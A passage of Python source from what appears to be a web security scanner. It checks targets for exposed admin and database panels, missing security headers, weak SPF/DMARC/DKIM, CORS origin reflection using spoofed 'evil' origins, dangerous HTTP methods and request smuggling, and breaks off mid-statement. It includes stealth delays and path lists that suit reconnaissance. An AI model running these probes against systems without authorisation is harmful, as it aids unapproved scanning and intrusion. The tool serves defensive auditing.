    ("/xmlrpc.php",              "MEDIUM",   "WordPress XML-RPC enabled — brute force and DDoS amplification risk"),
    ("/typo3",                   "HIGH",     "TYPO3 CMS admin accessible"),
    ("/administrator/index.php", "HIGH",     "Joomla administrator login"),
    ("/concrete/index.php",      "HIGH",     "Concrete5 CMS admin"),
    # Database tools
    ("/phpmyadmin",              "CRITICAL", "phpMyAdmin exposed — direct database access"),
    ("/phpmyadmin/",             "CRITICAL", "phpMyAdmin exposed — direct database access"),
    ("/pma",                     "CRITICAL", "phpMyAdmin (pma) exposed"),
    ("/myadmin",                 "CRITICAL", "phpMyAdmin exposed"),
    ("/adminer",                 "CRITICAL", "Adminer database tool exposed"),
    ("/adminer.php",             "CRITICAL", "Adminer database tool exposed"),
    # Server status / monitoring
    ("/server-status",           "HIGH",     "Apache server-status exposed — active connections, request details, client IPs"),
    ("/server-info",             "HIGH",     "Apache server-info exposed — full server configuration"),
    ("/nginx_status",            "MEDIUM",   "nginx stub_status exposed"),
    # API documentation
    ("/swagger",                 "MEDIUM",   "Swagger UI exposed — API schema enumerable"),
    ("/swagger-ui",              "MEDIUM",   "Swagger UI exposed"),
    ("/swagger-ui.html",         "MEDIUM",   "Swagger UI exposed"),
    ("/swagger-ui/",             "MEDIUM",   "Swagger UI exposed"),
    ("/swagger/index.html",      "MEDIUM",   "Swagger UI exposed"),
    ("/api/swagger",             "MEDIUM",   "API Swagger UI exposed"),
    ("/api/swagger-ui",          "MEDIUM",   "API Swagger UI exposed"),
    ("/api-docs",                "MEDIUM",   "API documentation exposed"),
    ("/api/api-docs",            "MEDIUM",   "API documentation exposed"),
    ("/openapi.json",            "MEDIUM",   "OpenAPI spec exposed — full API schema enumerable"),
    ("/openapi.yaml",            "MEDIUM",   "OpenAPI spec exposed"),
    ("/api/openapi.json",        "MEDIUM",   "OpenAPI spec exposed"),
    ("/v1/api-docs",             "MEDIUM",   "API v1 documentation exposed"),
    ("/v2/api-docs",             "MEDIUM",   "API v2 documentation exposed"),
    ("/v3/api-docs",             "MEDIUM",   "API v3 documentation exposed"),
    ("/redoc",                   "MEDIUM",   "ReDoc API documentation exposed"),
    ("/api/docs",                "MEDIUM",   "API documentation accessible"),
    # Debug consoles
    ("/console",                 "CRITICAL", "Interactive console/REPL endpoint accessible — possible RCE"),
    ("/_debugbar",               "HIGH",     "Laravel DebugBar exposed — reveals request internals, queries, and config"),
    ("/telescope",               "HIGH",     "Laravel Telescope exposed — full application introspection"),
    ("/horizon",                 "HIGH",     "Laravel Horizon exposed — queue management interface"),
    ("/_profiler",               "HIGH",     "Symfony Profiler exposed — reveals request internals and route list"),
    ("/rails/info/properties",   "HIGH",     "Rails info/properties exposed — reveals app config and routes"),
    ("/rails/info/routes",       "HIGH",     "Rails route list exposed"),
]

# Body signatures that confirm a real admin/tool page vs a catch-all 200.
# Keys are path substrings — first match wins.
ADMIN_PANEL_SIGNATURES = {
    "phpmyadmin":           ["phpMyAdmin", "pma_username", "phpmyadmin"],
    "pma":                  ["phpMyAdmin", "pma_username"],
    "myadmin":              ["phpMyAdmin", "pma_username"],
    "adminer":              ["Adminer", "adminer", "db_driver", "login-form"],
    "wp-admin":             ["WordPress", "wp-login", "wp-admin"],
    "wp-login.php":         ["WordPress", "user_login", "log", "pwd"],
    "xmlrpc.php":           ["XML-RPC server", "xmlrpc"],
    "server-status":        ["Server Version:", "requests currently being processed", "Apache Server Status"],
    "server-info":          ["Apache Server Information", "Module Name", "mod_"],
    "nginx_status":         ["Active connections:", "server accepts handled"],
    "swagger":              ["swagger", "Swagger UI", "SwaggerUIBundle", "api-docs"],
    "openapi.json":         ['"openapi"', '"swagger"', '"paths"'],
    "openapi.yaml":         ["openapi:", "swagger:", "paths:"],
    "redoc":                ["ReDoc", "redoc", "api-docs"],
    "_debugbar":            ["debugbar", "DebugBar", "phpdebugbar"],
    "telescope":            ["telescope", "Telescope", "laravel-telescope"],
    "horizon":              ["horizon", "Horizon", "laravel-horizon"],
    "_profiler":            ["Symfony Profiler", "sf-profiler", "wdt-content"],
    "console":              ["console", "REPL", "Interactive Console", "Werkzeug Debugger", "werkzeug"],
    "rails/info":           ["Rails", "Controller", "ruby"],
    "cpanel":               ["cPanel", "Web Hosting Control Panel"],
    "whm":                  ["WHM", "Web Host Manager"],
}

def _admin_body_sigs(path):
    """Return signature list for path, or None if no confirmation needed."""
    for key, sigs in ADMIN_PANEL_SIGNATURES.items():
        if key in path:
            return sigs
    return None

_admin_checked = set()

def check_admin_panels(base_url, domain):
    """
    Probe for exposed admin panels, database tools, API documentation,
    server status pages, and debug consoles.

    Strategy:
    - Canary probe first to detect catch-all 200 servers (skip if triggered).
    - 200 responses: confirm with body signatures where available, then alert.
    - 401/403 responses: resource confirmed to exist (auth wall) — alert MEDIUM/LOW.
    - All probes run concurrently via ThreadPoolExecutor.
    """
    if domain in _admin_checked:
        return
    _admin_checked.add(domain)

    # Canary — if a random nonexistent path returns 200 we can't trust 200s
    canary = base_url.rstrip("/") + f"/nuscrape-canary-{random.randint(100000,999999)}.admin"
    catch_all_200 = False
    try:
        cr = _get_session().get(canary, headers=create_request_header(),
                          timeout=4, allow_redirects=False)
        if cr and cr.status_code == 200:
            catch_all_200 = True
            print(timestamp() + f" Admin panel check: catch-all 200 on {domain} — 200 responses will be skipped")
    except Exception:
        pass

    def _probe(path, severity, description):
        url = base_url.rstrip("/") + path
        try:
            stealth_delay(domain)
            resp = _get_session().get(url, headers=create_request_header(),
                                timeout=4, allow_redirects=False)
            if not resp:
                return
            status = resp.status_code

            if status in (200, 206):
                if catch_all_200:
                    return  # Can't trust 200 on this server
                body = resp.text
                sigs = _admin_body_sigs(path)
                if sigs and not any(s.lower() in body.lower() for s in sigs):
                    return  # 200 but body doesn't match — likely catch-all or unrelated page
                alert(f"ADMIN PANEL EXPOSED", severity, url,
                      description + f" (HTTP {status})")
                print(timestamp() + f" [!!] Admin panel [{severity}]: {url}")

            elif status in (401, 403):
                # Resource exists behind auth — lower severity than open access
                sev_map = {"CRITICAL": "HIGH", "HIGH": "MEDIUM", "MEDIUM": "LOW", "LOW": "LOW"}
                reduced = sev_map.get(severity, "LOW")
                alert("ADMIN PANEL FOUND (AUTH REQUIRED)", reduced, url,
                      description.split(" —")[0] + f" — protected (HTTP {status}), verify auth bypass")
                print(timestamp() + f"  Admin panel (auth) [{reduced}]: {url} ({status})")

        except requests.exceptions.Timeout:
            pass  # server hung — expected for scanner probes, not an error
        except Exception as e:
            print_error(f"check_admin_panels probe failed for {url}: {e}")

    from concurrent.futures import ThreadPoolExecutor, as_completed
    with ThreadPoolExecutor(max_workers=10) as ex:
        futures = [ex.submit(_probe, path, sev, desc) for path, sev, desc in ADMIN_PANEL_PATHS]
        for f in as_completed(futures):
            pass


# ─────────────────────────────────────────────
# Security headers audit
# ─────────────────────────────────────────────

# (header_name_lowercase, severity, finding_name, detail)
_SEC_HEADERS_REQUIRED = [
    (
        "strict-transport-security",
        "MEDIUM",
        "MISSING HSTS",
        "Strict-Transport-Security absent — HTTPS not enforced, connection may be downgraded to HTTP",
    ),
    (
        "content-security-policy",
        "MEDIUM",
        "MISSING CSP",
        "Content-Security-Policy absent — no XSS mitigation policy in place",
    ),
    (
        "x-frame-options",
        "MEDIUM",
        "MISSING X-FRAME-OPTIONS",
        "X-Frame-Options absent (and no CSP frame-ancestors) — site may be embeddable; clickjacking risk",
    ),
    (
        "x-content-type-options",
        "LOW",
        "MISSING X-CONTENT-TYPE-OPTIONS",
        "X-Content-Type-Options: nosniff absent — browser may MIME-sniff responses and execute mistyped scripts",
    ),
    (
        "referrer-policy",
        "LOW",
        "MISSING REFERRER-POLICY",
        "Referrer-Policy absent — full URL including query string sent to third-party origins via Referer header",
    ),
    (
        "permissions-policy",
        "LOW",
        "MISSING PERMISSIONS-POLICY",
        "Permissions-Policy absent — browser capabilities (camera, mic, geolocation) not explicitly restricted",
    ),
]

# Headers that disclose server internals — flagged when present, not when absent
# (header_name_lowercase, version_pattern, severity, detail_template)
_SEC_HEADERS_REVEALING = [
    (
        "server",
        re.compile(r"(?:Apache|nginx|IIS|lighttpd|openresty|litespeed|gunicorn|tornado|jetty|tomcat|jboss|websphere|weblogic)/[\d.]+", re.I),
        "LOW",
        "Server header discloses version: {value}",
    ),
    (
        "x-powered-by",
        re.compile(r".+"),
        "LOW",
        "X-Powered-By header reveals technology stack: {value}",
    ),
    (
        "x-aspnet-version",
        re.compile(r".+"),
        "LOW",
        "X-AspNet-Version reveals .NET runtime version: {value}",
    ),
    (
        "x-aspnetmvc-version",
        re.compile(r".+"),
        "LOW",
        "X-AspNetMvc-Version reveals ASP.NET MVC version: {value}",
    ),
]

_sec_headers_checked = set()

def check_security_headers(base_url, domain):
    """
    Audit HTTP security headers on the base URL.

    Checks for:
    - Missing defensive headers: HSTS, CSP, X-Frame-Options, X-Content-Type-Options,
      Referrer-Policy, Permissions-Policy
    - Revealing headers that disclose server/framework versions: Server, X-Powered-By,
      X-AspNet-Version, X-AspNetMvc-Version

    HSTS is only flagged on HTTPS sites — it has no effect over plain HTTP.
    X-Frame-Options is only flagged if CSP does not include a frame-ancestors directive,
    since frame-ancestors supersedes X-Frame-Options per spec.
    """
    if domain in _sec_headers_checked:
        return
    _sec_headers_checked.add(domain)

    try:
        resp = safe_get(base_url, timeout=8)
        if not resp:
            return
        hdrs = {k.lower(): v for k, v in resp.headers.items()}
        is_https = base_url.startswith("https://")

        for hdr_name, severity, finding, detail in _SEC_HEADERS_REQUIRED:
            # HSTS only meaningful over HTTPS
            if hdr_name == "strict-transport-security" and not is_https:
                continue

            # X-Frame-Options: skip if CSP already has frame-ancestors (it supersedes XFO)
            if hdr_name == "x-frame-options":
                csp = hdrs.get("content-security-policy", "")
                if "frame-ancestors" in csp.lower():
                    continue

            if hdr_name not in hdrs:
                alert(finding, severity, base_url, detail)
                print(timestamp() + f"  Security header [{severity}] missing on {domain}: {hdr_name}")

        # Check for revealing headers
        for hdr_name, pattern, severity, detail_tmpl in _SEC_HEADERS_REVEALING:
            value = hdrs.get(hdr_name, "")
            if value and pattern.search(value):
                detail = detail_tmpl.format(value=value)
                alert("INFORMATION DISCLOSURE — HEADER", severity, base_url, detail)
                print(timestamp() + f"  Revealing header [{severity}] on {domain}: {hdr_name}: {value}")

    except Exception as e:
        print_error(f"check_security_headers failed for {domain}: {e}")


def count_spf_lookups(domain, depth=0, visited=None):
    """
    Recursively count DNS-querying mechanisms in an SPF record.

    Mechanisms that consume a lookup (RFC 7208 §4.6.4):
      include:, a, mx, ptr, exists:, redirect=
    Mechanisms that do NOT count: ip4:, ip6:, all, exp=, v=spf1

    Caps recursion at depth 15 and tracks visited domains to prevent cycles.
    Returns the total integer count of DNS lookups required to evaluate the record.
    """
    if visited is None:
        visited = set()
    if depth > 15 or domain in visited:
        return 0
    visited.add(domain)

    try:
        txt_records = dns.resolver.resolve(domain, 'TXT')
        spf = None
        for r in txt_records:
            val = r.to_text().strip('"')
            if val.startswith('v=spf1'):
                spf = val
                break
        if not spf:
            return 0
    except Exception:
        return 0

    count = 0
    for term in spf.split():
        term_lc = term.lower().lstrip('+-?~')
        if term_lc.startswith('include:'):
            count += 1
            count += count_spf_lookups(term[term.index(':') + 1:], depth + 1, visited)
        elif term_lc.startswith('redirect='):
            count += 1
            count += count_spf_lookups(term[term.index('=') + 1:], depth + 1, visited)
        elif (term_lc in ('a', 'mx', 'ptr') or
              term_lc.startswith(('a:', 'mx:', 'ptr:', 'exists:'))):
            count += 1
    return count


_DKIM_SELECTORS = ["default", "google", "k1", "mail", "dkim", "selector1", "selector2"]

def check_dkim_selectors(root):
    """
    Probe common DKIM selector TXT records at <selector>._domainkey.<root>.
    Reports MEDIUM if no selectors are found — indicates DKIM is not configured,
    weakening email authentication alongside SPF/DMARC.
    """
    found = []
    for sel in _DKIM_SELECTORS:
        try:
            answers = dns.resolver.resolve(f"{sel}._domainkey.{root}", "TXT")
            for rr in answers:
                val = rr.to_text().strip('"')
                if "p=" in val or "v=DKIM1" in val:
                    found.append(sel)
                    break
        except (dns.resolver.NXDOMAIN, dns.resolver.NoAnswer,
                dns.exception.Timeout, dns.resolver.NoNameservers):
            pass
        except Exception:
            pass

    if found:
        print(timestamp() + f" DKIM selectors found for {root}: {', '.join(found)}")
    else:
        alert(
            "NO DKIM SELECTORS FOUND",
            "MEDIUM",
            root,
            f"No DKIM TXT records found at standard selectors "
            f"({', '.join(_DKIM_SELECTORS)}) for {root} — "
            f"emails cannot be DKIM-signed, weakening email authentication"
        )
        print(timestamp() + f" [!] No DKIM selectors found for {root}")


def check_spf_dmarc(domain):
    """
    Query DNS TXT records to check SPF, DMARC, and DKIM configuration.

    Reportable findings:
      - Missing SPF entirely     → anyone can spoof @domain email
      - SPF with +all            → explicitly allows any server to send
      - SPF with ?all            → neutral/permissive, no spoofing protection
      - SPF with ~all            → softfail, not a hard reject
      - SPF lookup count > 10   → permerror at receiving MTAs (RFC 7208)
      - Missing DMARC            → no policy enforcement even if SPF/DKIM fail
      - DMARC with p=none        → monitoring only, no rejection/quarantine
      - DMARC with p=quarantine  → partial enforcement, upgrade to reject
      - DMARC missing rua=       → no aggregate reports, org is blind to spoofing
      - DMARC missing ruf=       → no forensic reports on individual failures
      - DMARC pct < 100          → policy not applied to all mail
      - DMARC sp= weaker than p= → subdomain spoofing less restricted than parent
      - No DKIM selectors found  → DKIM not configured
    """
    root = extract_root_domain(domain)

    # Only check once per root domain
    if not hasattr(check_spf_dmarc, "_checked"):
        check_spf_dmarc._checked = set()
    if root in check_spf_dmarc._checked:
        return
    check_spf_dmarc._checked.add(root)

    # ── SPF ──────────────────────────────────────────────────
    try:
        txt_records = dns.resolver.resolve(root, 'TXT')
        spf_record = None
        for record in txt_records:
            val = record.to_text().strip('"')
            if val.startswith("v=spf1"):
                spf_record = val
                break

        if spf_record is None:
            alert(
                "MISSING SPF RECORD",
                "HIGH",
                root,
                f"No SPF TXT record found for {root} — anyone can spoof email from this domain"
            )
            print(timestamp() + " [!] No SPF record for " + root)
        elif "+all" in spf_record:
            alert(
                "SPF MISCONFIGURATION: +all",
                "HIGH",
                root,
                f"SPF record uses +all — explicitly permits any server to send as {root}: {spf_record}"
            )
            print(timestamp() + " [!!] SPF +all on " + root)
        elif "?all" in spf_record:
            alert(
                "SPF MISCONFIGURATION: ?all",
                "HIGH",
                root,
                f"SPF record uses ?all (neutral) — provides no spoofing protection, receiving MTAs treat unauthenticated mail as neither pass nor fail: {spf_record}"
            )
            print(timestamp() + " [!] SPF ?all on " + root)
        elif "~all" in spf_record:
            alert(
                "SPF SOFTFAIL: ~all",
                "LOW",
                root,
                f"SPF record uses ~all (softfail) — failing messages are accepted and tagged "
                f"rather than rejected; upgrade to -all for hard enforcement: {spf_record}"
            )
            print(timestamp() + " [!] SPF ~all (softfail) on " + root)
        else:
            print(timestamp() + " SPF OK for " + root + ": " + spf_record[:80])

        # Recursive lookup count — RFC 7208 §4.6.4 limits evaluation to 10 DNS queries.
        # Exceeding this causes a permerror at receiving MTAs, which most treat as fail.
        if spf_record is not None:
            try:
                lookup_count = count_spf_lookups(root)
                if lookup_count > 10:
                    alert(
                        "SPF LOOKUP LIMIT EXCEEDED",
                        "MEDIUM",
                        root,
                        f"SPF record for {root} requires {lookup_count} DNS lookups "
                        f"(RFC 7208 limit is 10) — receiving MTAs will return permerror, "
                        f"causing legitimate mail to fail authentication"
                    )
                    print(timestamp() + f" [!] SPF lookup limit exceeded on {root}: {lookup_count} lookups")
            except Exception as _e:
                print_error(f"count_spf_lookups failed for {root}: {_e}")

    except (dns.resolver.NXDOMAIN, dns.resolver.NoAnswer,
            dns.exception.Timeout, dns.resolver.NoNameservers):
        alert(
            "MISSING SPF RECORD",
            "HIGH",
            root,
            f"No TXT records found for {root} — SPF absent, email spoofing possible"
        )

    # ── DMARC ────────────────────────────────────────────────
    try:
        dmarc_domain = "_dmarc." + root
        dmarc_records = dns.resolver.resolve(dmarc_domain, 'TXT')
        dmarc_record = None
        for record in dmarc_records:
            val = record.to_text().strip('"')
            if val.startswith("v=DMARC1"):
                dmarc_record = val
                break

        if dmarc_record is None:
            alert(
                "MISSING DMARC RECORD",
                "HIGH",
                root,
                f"No DMARC record at _dmarc.{root} — no enforcement policy, SPF/DKIM failures are not acted on"
            )
            print(timestamp() + " [!] No DMARC record for " + root)
        else:
            # Parse the policy value
            policy = None
            for part in dmarc_record.split(";"):
                part = part.strip()
                if part.startswith("p="):
                    policy = part[2:].strip().lower()
                    break

            # Parse all tags into a dict for the extended checks below
            dmarc_tags = {}
            for part in dmarc_record.split(";"):
                part = part.strip()
                if "=" in part:
                    k, _, v = part.partition("=")
                    dmarc_tags[k.strip().lower()] = v.strip()

            has_rua = "rua" in dmarc_tags and dmarc_tags["rua"]

            if policy == "none":
                alert(
                    "DMARC POLICY: p=none (monitor only)",
                    "MEDIUM",
                    root,
                    f"DMARC exists but p=none — emails that fail SPF/DKIM are NOT rejected or quarantined: {dmarc_record}"
                )
                print(timestamp() + " [!] DMARC p=none on " + root)
            elif policy == "quarantine":
                alert(
                    "DMARC POLICY: p=quarantine (partial enforcement)",
                    "MEDIUM",
                    root,
                    f"DMARC p=quarantine — failing messages are quarantined rather than rejected; "
                    f"upgrade to p=reject for full enforcement: {dmarc_record}"
                )
                print(timestamp() + " [!] DMARC p=quarantine on " + root)
            elif policy == "reject":
                print(timestamp() + " DMARC OK for " + root + " (p=reject — full enforcement)")
            else:
                print(timestamp() + " DMARC OK for " + root + " (p=" + str(policy) + ")")

            # rua= check — missing means org receives no aggregate failure reports (LOW for any policy)
            if not has_rua and policy != "none":
                alert(
                    "DMARC NO AGGREGATE REPORTING: rua= missing",
                    "LOW",
                    root,
                    f"DMARC record has no rua= tag — no aggregate reports will be sent, "
                    f"organisation is blind to spoofing attempts against {root}: {dmarc_record}"
                )
                print(timestamp() + " [!] DMARC missing rua= on " + root)

            # ruf= check — missing means no per-message forensic reports
            has_ruf = "ruf" in dmarc_tags and dmarc_tags["ruf"]
            if not has_ruf:
                alert(
                    "DMARC NO FORENSIC REPORTING: ruf= missing",
                    "INFO",
                    root,
                    f"DMARC record has no ruf= tag — no per-message forensic reports will be sent "
                    f"on authentication failures: {dmarc_record}"
                )

            # pct= check — partial policy application
            if "pct" in dmarc_tags:
                try:
                    pct = int(dmarc_tags["pct"])
                    if pct < 100:
                        alert(
                            "DMARC PARTIAL POLICY: pct<100",
                            "LOW",
                            root,
                            f"DMARC pct={pct} — policy is only applied to {pct}% of failing messages; "
                            f"remaining {100 - pct}% are delivered without enforcement: {dmarc_record}"
                        )
                        print(timestamp() + f" [!] DMARC pct={pct} (partial) on {root}")
                except ValueError:
                    pass

            # sp= check — subdomain policy must not be weaker than parent
            if "sp" in dmarc_tags:
                sp_policy = dmarc_tags["sp"].strip().lower()
                _policy_rank = {"reject": 2, "quarantine": 1, "none": 0}
                parent_rank  = _policy_rank.get(policy or "none", 0)
                sub_rank     = _policy_rank.get(sp_policy, 0)
                if sub_rank < parent_rank:
                    alert(
                        "DMARC SUBDOMAIN POLICY WEAKER THAN PARENT",
                        "MEDIUM",
                        root,
                        f"DMARC sp={sp_policy} is weaker than the parent policy p={policy} — "
                        f"subdomain spoofing is less restricted than the main domain: {dmarc_record}"
                    )
                    print(timestamp() + f" [!] DMARC sp={sp_policy} weaker than p={policy} on {root}")

    except (dns.resolver.NXDOMAIN, dns.resolver.NoAnswer,
            dns.exception.Timeout, dns.resolver.NoNameservers):
        alert(
            "MISSING DMARC RECORD",
            "HIGH",
            root,
            f"No DMARC record found for _dmarc.{root} — no enforcement policy"
        )
        print(timestamp() + " [!] No DMARC record for " + root)

    # ── DKIM ─────────────────────────────────────────────────
    check_dkim_selectors(root)

def check_cors_misconfiguration(base_url, domain):
    """
    Test for CORS misconfigurations using four distinct Origin probes.

    Test 1 — Arbitrary origin reflection:
      Origin: https://evil-cors-probe.com
      Flags CRITICAL if reflected with credentials, HIGH if reflected alone.

    Test 2 — Null origin bypass:
      Origin: null
      Browsers send this from sandboxed iframes. Flags HIGH if ACAO=null
      and credentials are allowed.

    Test 3 — Pre-domain prefix match:
      Origin: https://evil<domain> (e.g. https://evilexample.com)
      Indicates the server matches by prefix instead of exact string.
      Flags HIGH if reflected with credentials.

    Test 4 — Subdomain wildcard trust:
      Origin: https://evil.<domain>
      Indicates the server trusts all subdomains. Flags HIGH if reflected
      with credentials — any compromised subdomain can steal cookies.

    Tests 2-4 only flag when Allow-Credentials: true is also present.
    All four probes run in a single call — deduplication is handled by
    the caller via _exposure_checked.
    """
    try:
        root = extract_root_domain(domain)

        # ── Test 1: Arbitrary origin ───────────────────────────────
        evil_origin = "https://evil-cors-probe.com"
        stealth_delay(domain)
        resp = _get_session().get(
            base_url,
            headers={**create_request_header(), "Origin": evil_origin},
            timeout=8,
            allow_redirects=True,
        )
        if not resp:
            return

        acao  = resp.headers.get("Access-Control-Allow-Origin", "")
        acac  = resp.headers.get("Access-Control-Allow-Credentials", "").lower()
        acam  = resp.headers.get("Access-Control-Allow-Methods", "")

        reflects_origin    = acao == evil_origin
        wildcard           = acao == "*"
        allows_credentials = acac == "true"

        if reflects_origin and allows_credentials:
            alert(
                "CORS MISCONFIGURATION: ORIGIN REFLECTION + CREDENTIALS",
                "CRITICAL",
                domain,
                f"Server reflects arbitrary Origin and sets Allow-Credentials: true — "
                f"cross-origin requests with cookies are permitted. ACAO: {acao}"
            )
            print(timestamp() + " [!!] Critical CORS misconfiguration on " + domain)
        elif reflects_origin:
            alert(
                "CORS MISCONFIGURATION: ORIGIN REFLECTION",
                "HIGH",
                domain,
                f"Server reflects arbitrary Origin header. ACAO: {acao}, "
                f"Methods: {acam or 'not specified'}"
            )
            print(timestamp() + " [!] CORS reflects origin on " + domain)
        elif wildcard and allows_credentials:
            alert(
                "CORS MISCONFIGURATION: WILDCARD + CREDENTIALS",
                "HIGH",
                domain,
                f"Access-Control-Allow-Origin: * combined with Allow-Credentials: true — "
                f"non-standard but potentially exploitable"
            )
            print(timestamp() + " [!] CORS wildcard+credentials on " + domain)

        # ── Test 2: Null origin bypass ─────────────────────────────
        stealth_delay(domain)
        null_resp = _get_session().get(
            base_url,
            headers={**create_request_header(), "Origin": "null"},
            timeout=8,
            allow_redirects=True,
        )
        if null_resp:
            null_acao = null_resp.headers.get("Access-Control-Allow-Origin", "")
            null_acac = null_resp.headers.get("Access-Control-Allow-Credentials", "").lower()
            if null_acao == "null" and null_acac == "true":
                alert(
                    "CORS BYPASS: NULL ORIGIN + CREDENTIALS",
                    "HIGH",
                    domain,
                    f"Server trusts Origin: null with Allow-Credentials: true — browsers send "
                    f"null origin from sandboxed iframes, enabling cross-origin credential theft. "
                    f"ACAO: {null_acao}"
                )
                print(timestamp() + f" [!] CORS null origin bypass on {domain}")

        # ── Test 3: Pre-domain prefix match bypass ─────────────────
        pre_origin = f"https://evil{root}"
        stealth_delay(domain)
        pre_resp = _get_session().get(
            base_url,
            headers={**create_request_header(), "Origin": pre_origin},
            timeout=8,
            allow_redirects=True,
        )
        if pre_resp:
            pre_acao = pre_resp.headers.get("Access-Control-Allow-Origin", "")
            pre_acac = pre_resp.headers.get("Access-Control-Allow-Credentials", "").lower()
            if pre_acao == pre_origin and pre_acac == "true":
                alert(
                    "CORS BYPASS: PRE-DOMAIN PREFIX MATCH + CREDENTIALS",
                    "HIGH",
                    domain,
                    f"Server reflects pre-domain origin '{pre_acao}' with Allow-Credentials: true — "
                    f"indicates prefix rather than exact origin matching; an attacker controlling "
                    f"a domain prefixed with '{root}' can steal credentials"
                )
                print(timestamp() + f" [!] CORS pre-domain prefix bypass on {domain}: {pre_acao}")

        # ── Test 4: Subdomain wildcard trust bypass ────────────────
        sub_origin = f"https://evil.{root}"
        stealth_delay(domain)
        sub_resp = _get_session().get(
            base_url,
            headers={**create_request_header(), "Origin": sub_origin},
            timeout=8,
            allow_redirects=True,
        )
        if sub_resp:
            sub_acao = sub_resp.headers.get("Access-Control-Allow-Origin", "")
            sub_acac = sub_resp.headers.get("Access-Control-Allow-Credentials", "").lower()
            if sub_acao == sub_origin and sub_acac == "true":
                alert(
                    "CORS BYPASS: SUBDOMAIN WILDCARD TRUST + CREDENTIALS",
                    "HIGH",
                    domain,
                    f"Server reflects subdomain origin '{sub_acao}' with Allow-Credentials: true — "
                    f"any compromised or attacker-controlled subdomain of '{root}' can steal "
                    f"session cookies cross-origin"
                )
                print(timestamp() + f" [!] CORS subdomain wildcard bypass on {domain}: {sub_acao}")

    except Exception as e:
        print_error("check_cors_misconfiguration failed for " + domain + ": " + str(e))

# ─────────────────────────────────────────────
# Dangerous HTTP method testing
# ─────────────────────────────────────────────

# Methods beyond GET/POST/HEAD that servers should not accept on web endpoints.
# TRACE enables XST (cross-site tracing) cookie theft.
# PUT/DELETE allow file creation/deletion if misconfigured.
# CONNECT can be abused as an open proxy.
_DANGEROUS_METHODS = ["TRACE", "PUT", "DELETE", "CONNECT", "PATCH"]

_dangerous_method_checked = set()

def check_dangerous_http_methods(base_url, domain):
    """
    Send each dangerous HTTP method to the root path and flag any that return
    a 2xx or 405 response (405 = Method Not Allowed confirms the server
    processes the method even if it rejects it for this path).

    Severities:
      TRACE                → HIGH  (enables XST — credentials readable cross-origin)
      PUT / DELETE         → HIGH  (file write/delete if misconfigured)
      CONNECT              → MEDIUM (potential open-proxy abuse)
      PATCH                → LOW   (generally low risk unless write access confirmed)
    """
    if base_url in _dangerous_method_checked:
        return
    _dangerous_method_checked.add(base_url)

    _method_severity = {
        "TRACE":   "HIGH",
        "PUT":     "HIGH",
        "DELETE":  "HIGH",
        "CONNECT": "MEDIUM",
        "PATCH":   "LOW",
    }

    for method in _DANGEROUS_METHODS:
        try:
            stealth_delay(domain)
            resp = _get_session().request(
                method,
                base_url,
                headers=create_request_header(),
                timeout=6,
                allow_redirects=False,
                verify=False,
            )
            # 2xx = method accepted; 405 = server acknowledged it but rejected for this path.
            # Either indicates the server is processing the method.
            # 501 = not implemented (server actively refuses) — not reportable.
            if resp.status_code in range(200, 300):
                severity = _method_severity.get(method, "LOW")
                alert(
                    f"DANGEROUS HTTP METHOD ACCEPTED: {method}",
                    severity,
                    domain,
                    f"{method} {base_url} returned {resp.status_code} — "
                    f"server accepted the request"
                )
                print(timestamp() + f" [!] {method} accepted on {base_url} ({resp.status_code})")
            elif resp.status_code == 405:
                # 405 is a weaker signal — server parsed the method but denied it.
                # Only flag TRACE here since XST risk is confirmed even with 405
                # (some frameworks reflect headers before sending 405).
                if method == "TRACE":
                    alert(
                        "DANGEROUS HTTP METHOD: TRACE ENABLED (405)",
                        "MEDIUM",
                        domain,
                        f"TRACE {base_url} returned 405 — server parsed the TRACE request; "
                        f"verify whether response headers are reflected (XST risk)"
                    )
                    print(timestamp() + f" [!] TRACE 405 on {base_url} — possible XST risk")
        except Exception as e:
            print_error(f"check_dangerous_http_methods: {method} {base_url}: {e}")


# ─────────────────────────────────────────────
# HTTP request smuggling detection
# ─────────────────────────────────────────────

_smuggling_tested: set = set()


def _smuggling_raw_send(host: str, port: int, use_ssl: bool,
                        raw: bytes, timeout: int = 10) -> tuple:
    """
    Open a raw TCP (or TLS) socket, send `raw`, and read the response.
    Returns (response_bytes, timed_out).  Never raises — exceptions are
    caught and treated as (b"", False).
    """
    try:
        sock = socket.create_connection((host, port), timeout=timeout)
        if use_ssl:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode    = ssl.CERT_NONE
            sock = ctx.wrap_socket(sock, server_hostname=host)
        sock.settimeout(timeout)
        sock.sendall(raw)
        buf = b""
        try:
            while True:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                buf += chunk
                # Stop once headers + a small body have arrived — we don't
                # need the full response, just enough to read the status line.
                if b"\r\n\r\n" in buf and len(buf) > 512:
                    break
        except socket.timeout:
            return buf, True   # timeout while reading → server is waiting
        finally:
            try:
                sock.close()
            except Exception:
                pass
        return buf, False
    except socket.timeout:
        return b"", True
    except Exception:
        return b"", False


def _smuggling_status(response_bytes: bytes) -> int:
    """Parse the HTTP status code from a raw response, or 0 on failure."""
    try:
        first_line = response_bytes.split(b"\r\n", 1)[0]
        return int(first_line.split(b" ", 2)[1])
    except Exception:
        return 0


def check_http_smuggling(base_url: str, domain: str) -> None:
    """
    Probe the target host for CL.TE, TE.CL, and TE.TE request smuggling
    desync vulnerabilities using raw socket connections.

    Detection is timing- and status-based only — no queue poisoning, no
    attempt to affect other users.  All findings are MEDIUM and require
    manual confirmation with Burp Suite's HTTP Request Smuggler.

    Only runs when --active-probes is enabled. Deduplicates per host.
    10-second socket timeout per probe.
    """
    parsed   = urlparse(base_url)
    host     = parsed.hostname or domain
    use_ssl  = parsed.scheme == "https"
    port     = parsed.port or (443 if use_ssl else 80)
    dedup_key = f"{host}:{port}"

    if dedup_key in _smuggling_tested:
        return
    _smuggling_tested.add(dedup_key)

    # Helper: build a minimal raw HTTP/1.1 POST request
    def _build(extra_headers: dict, body: bytes) -> bytes:
        hdrs  = f"POST / HTTP/1.1\r\nHost: {host}\r\n"
        for k, v in extra_headers.items():
            hdrs += f"{k}: {v}\r\n"
        hdrs += "Connection: close\r\n\r\n"
        return hdrs.encode() + body

    # ── Baseline: a normal POST so we know what a clean response looks like ──
    baseline_raw  = _build({"Content-Length": "0"}, b"")
    baseline_resp, baseline_timeout = _smuggling_raw_send(
        host, port, use_ssl, baseline_raw, timeout=10)
    baseline_status = _smuggling_status(baseline_resp)

    # If baseline itself timed out the host is too slow to probe reliably.
    if baseline_timeout:
        return

    def _flag(technique: str, detail: str) -> None:
        alert(
            f"HTTP REQUEST SMUGGLING — {technique}",
            "MEDIUM",
            base_url,
            detail + (
